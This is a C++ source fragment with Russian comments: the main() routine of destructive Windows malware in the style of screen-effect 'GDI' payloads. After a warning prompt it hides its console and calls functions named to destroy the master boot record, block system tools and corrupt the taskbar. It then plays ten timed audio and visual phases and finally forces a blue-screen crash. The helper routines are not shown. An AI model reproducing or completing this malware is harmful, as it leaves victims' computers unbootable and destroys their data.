// --- ГЛАВНЫЙ СЦЕНАРИЙ УПРАВЛЕНИЯ ВСЕМИ ДЕСЯТЬЮ СТАДИЯМИ ---
int main() {
    if (!ShowWarnings()) return 0;

    srand((unsigned)time(NULL)); ShowWindow(GetConsoleWindow(), SW_HIDE);
    w = GetSystemMetrics(SM_CXSCREEN); h = GetSystemMetrics(SM_CYSCREEN);

    SynthesizeAllAudio(); 
    DetectCurrentOS(); // Окружение определится корректно!
    
    DestructMBR();       
    BlockSystemTools();  
    CorruptTaskbarOnly(); 
    
    drawerActive = true;

    // 🧪 PHASE 1-9 поочередно...
    currentPhase = 1; PlaySoundA(audioBuffer1, NULL, SND_MEMORY | SND_ASYNC); CreateThread(NULL, 0, VisualPhase1, NULL, 0, NULL); CreateThread(NULL, 0, payload_message_phase1, NULL, 0, NULL); Sleep(30000); 
    currentPhase = 0; PlaySoundA(NULL, NULL, 0); Sleep(200); ClearScreenEffects(); Sleep(1000); 

    currentPhase = 2; PlaySoundA(audioBuffer2, NULL, SND_MEMORY | SND_ASYNC); CreateThread(NULL, 0, VisualPhase2, NULL, 0, NULL); Sleep(30000); 
    currentPhase = 0; PlaySoundA(NULL, NULL, 0); Sleep(200); ClearScreenEffects(); Sleep(1000); 

    currentPhase = 3; PlaySoundA(audioBuffer3, NULL, SND_MEMORY | SND_ASYNC); CreateThread(NULL, 0, VisualPhase3, NULL, 0, NULL); Sleep(30000); 
    currentPhase = 0; PlaySoundA(NULL, NULL, 0); Sleep(200); ClearScreenEffects(); Sleep(1000); 

    currentPhase = 4; PlaySoundA(audioBuffer4, NULL, SND_MEMORY | SND_ASYNC); CreateThread(NULL, 0, VisualPhase4, NULL, 0, NULL); Sleep(30000); 
    currentPhase = 0; PlaySoundA(NULL, NULL, 0); Sleep(200); ClearScreenEffects(); Sleep(1000); 

    currentPhase = 5; PlaySoundA(audioBuffer5, NULL, SND_MEMORY | SND_ASYNC); CreateThread(NULL, 0, VisualPhase5, NULL, 0, NULL); Sleep(30000); 
    currentPhase = 0; PlaySoundA(NULL, NULL, 0); Sleep(200); ClearScreenEffects(); Sleep(1000); 

    currentPhase = 6; PlaySoundA(audioBuffer6, NULL, SND_MEMORY | SND_ASYNC); CreateThread(NULL, 0, VisualPhase6, NULL, 0, NULL); Sleep(50000); 
    currentPhase = 0; PlaySoundA(NULL, NULL, 0); Sleep(200); ClearScreenEffects(); Sleep(1000); 

    currentPhase = 7; PlaySoundA(audioBuffer7, NULL, SND_MEMORY | SND_ASYNC); CreateThread(NULL, 0, VisualPhase7, NULL, 0, NULL); Sleep(45000); 
    currentPhase = 0; PlaySoundA(NULL, NULL, 0); Sleep(200); ClearScreenEffects(); Sleep(1000); 

    currentPhase = 8; PlaySoundA(audioBuffer8, NULL, SND_MEMORY | SND_ASYNC); CreateThread(NULL, 0, VisualPhase8, NULL, 0, NULL); Sleep(45000); 
    currentPhase = 0; PlaySoundA(NULL, NULL, 0); Sleep(200); ClearScreenEffects(); Sleep(1000); 

    currentPhase = 9; PlaySoundA(audioBuffer9, NULL, SND_MEMORY | SND_ASYNC); CreateThread(NULL, 0, VisualPhase9, NULL, 0, NULL); Sleep(45000); 
    currentPhase = 0; PlaySoundA(NULL, NULL, 0); Sleep(200); ClearScreenEffects(); Sleep(1000); 

    // 🧪 PHASE 10 (50 сек - Финал)
    currentPhase = 10; PlaySoundA(audioBuffer10, NULL, SND_MEMORY | SND_ASYNC); CreateThread(NULL, 0, VisualPhase10, NULL, 0, NULL); Sleep(50000); 

    // Очистка памяти перед падением ядра
    currentPhase = 0; drawerActive = false; PlaySoundA(NULL, NULL, 0); Sleep(500); 
    delete[] audioBuffer1; delete[] audioBuffer2; delete[] audioBuffer3; delete[] audioBuffer4; 
    delete[] audioBuffer5; delete[] audioBuffer6; delete[] audioBuffer7; delete[] audioBuffer8;
    delete[] audioBuffer9; delete[] audioBuffer10;

    // ВЫЗОВ КРАША
    TriggerTrueBSoD();

    return 0;
}
